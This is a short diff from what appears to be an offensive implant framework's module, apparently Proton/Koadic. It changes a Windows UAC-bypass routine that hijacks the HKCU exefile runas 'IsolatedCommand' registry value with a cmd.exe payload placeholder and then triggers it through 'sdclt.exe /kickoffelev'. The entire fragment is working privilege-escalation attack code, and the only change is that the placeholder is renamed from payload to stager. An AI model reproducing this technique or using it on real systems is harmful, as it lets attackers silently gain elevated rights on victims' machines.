@@ -28,7 +28,7 @@ try
     var path = "Software\\Classes\\exefile\\shell\\runas\\command";
 
     var cmd = proton.file.getPath("%COMSPEC%");
-    proton.registry.write(proton.registry.HKCU, path, "IsolatedCommand", cmd + " /c ~PAYLOAD_DATA~", proton.registry.STRING);
+    proton.registry.write(proton.registry.HKCU, path, "IsolatedCommand", cmd + " /c ~STAGER_DATA~", proton.registry.STRING);
 
     proton.shell.run("sdclt.exe /kickoffelev", true);
 
